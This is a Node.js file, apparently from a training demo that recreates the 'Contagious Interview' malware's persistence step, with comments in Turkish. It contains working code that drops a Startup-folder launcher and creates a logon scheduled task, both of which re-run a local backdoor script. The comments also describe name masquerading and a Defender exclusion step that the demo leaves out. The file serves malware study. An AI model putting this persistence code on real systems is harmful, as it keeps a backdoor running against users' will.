"use strict";

/**
 * persistence.js
 * --------------
 * RAPORDAKİ KARŞILIĞI: Tsunami bileşeninin kalıcılık (persistence)
 * mekanizmaları -- (1) Startup klasörüne dosya bırakma (bu vakada
 * GÖZLEMLENDİ) ve (2) PowerShell ile "Runtime Broker" adında bir
 * zamanlanmış görev oluşturma (bu vakada tetiklenmedi ama kod içinde
 * mevcuttu).
 *
 * Gerçek vakada kalıcılık dosyası, gerçek Windows süreçleriyle aynı isimle
 * (`Runtime Broker.exe`, `msedge.exe`) gizleniyordu -- kullanıcı Görev
 * Yöneticisi'ne baksa bile şüphelenmesin diye. Bu demoda BİLİNÇLİ olarak
 * o isimler KULLANILMADI; bunun yerine açıkça "demo" içeren bir isim
 * seçildi. Amaç, isim maskeleme TEKNİĞİNİ anlatmak, gerçekten yanıltıcı
 * bir isimle sisteme bir şey bırakmamak.
 *
 * BİLİNÇLİ OLARAK YAZILMAYAN KISIM: Tsunami'nin Defender exclusion ekleme
 * adımı (Add-MpPreference -ExclusionPath ...). Kullanıcı bu demoyu izole
 * bir VM'de çalıştıracak ve Defender'ı kendi takdiriyle manuel devre dışı
 * bırakacak -- bu depo hiçbir AV/EDR ayarını değiştirmez.
 */

const fs = require("fs");
const path = require("path");
const os = require("os");
const { execSync } = require("child_process");
const config = require("./config");

const DEMO_LABEL = "ContagiousInterviewDemo-Beacon";

function getStartupFolder() {
  // Rapordaki "%APPDATA%\Microsoft\Windows\Applications\..." yol mantığının
  // gerçek Windows Startup klasörü karşılığı.
  return path.join(os.homedir(), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup");
}

function installStartupPersistence() {
  if (os.platform() !== "win32") {
    console.log("[demo] Startup klasörü kalıcılığı yalnızca Windows demosu için yazıldı, atlanıyor.");
    return;
  }
  const startupDir = getStartupFolder();
  if (!fs.existsSync(startupDir)) {
    console.log("[demo] Startup klasörü bulunamadı, atlanıyor.");
    return;
  }

  const launcherPath = path.join(startupDir, `${DEMO_LABEL}.cmd`);
  const backdoorPath = path.join(__dirname, "backdoor.js");

  // Not: gerçek vakadaki dosya, diğer InvisibleFerret bileşenleriyle aynı
  // katmanlı (zlib+base64+ters çevirme) teknikle gizlenmişti. Burada
  // okunabilirlik için gizleme YAPILMADI -- kalıcılık MEKANİZMASI
  // (oturum açılışında otomatik çalışma) aynı, gizleme tekniği ayrı bir
  // konudur ve bu depoda amaçla ilgisiz olduğu için uygulanmadı.
  const launcherContents = `@echo off\nrem ${DEMO_LABEL} -- egitim demosu, oturum acilisinda demo backdoor'u yeniden baglar.\nnode "${backdoorPath}"\n`;

  fs.writeFileSync(launcherPath, launcherContents);
  console.log(`[demo] Startup kalıcılığı kuruldu: ${launcherPath}`);
}

function installScheduledTaskPersistence() {
  if (os.platform() !== "win32") return;
  const backdoorPath = path.join(__dirname, "backdoor.js");
  const nodeExe = process.execPath;
  try {
    // Rapordaki "PowerShell ile scheduled task oluşturma" adımının eşleniği.
    // /SC ONLOGON: oturum açılışında tetikle (rapordaki tetikleyiciyle aynı).
    execSync(
      `schtasks /Create /TN "${DEMO_LABEL}" /TR "\\"${nodeExe}\\" \\"${backdoorPath}\\"" /SC ONLOGON /F`,
      { windowsHide: true }
    );
    console.log(`[demo] Zamanlanmış görev oluşturuldu: ${DEMO_LABEL}`);
  } catch (err) {
    console.log(`[demo] Zamanlanmış görev oluşturulamadı (yönetici izni gerekebilir): ${err.message}`);
  }
}

function main() {
  if (process.env[config.requiredEnvFlag] !== "1") {
    console.log(`[demo] persistence.js devre dışı. Etkinleştirmek için: ${config.requiredEnvFlag}=1`);
    return;
  }
  installStartupPersistence();
  installScheduledTaskPersistence();
}

main();
